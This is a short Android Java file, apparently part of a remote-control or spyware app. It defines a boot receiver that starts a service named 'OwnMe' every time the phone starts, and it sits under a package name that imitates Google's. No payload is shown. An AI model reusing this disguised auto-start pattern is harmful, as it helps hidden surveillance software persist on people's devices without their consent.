package com.google.android.network;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by earthshakira on 26/1/17.
 */

public class BootCompletedIntentReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
            if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
                Intent pushIntent = new Intent(context, OwnMe.class);
                context.startService(pushIntent);
            }
    }
}
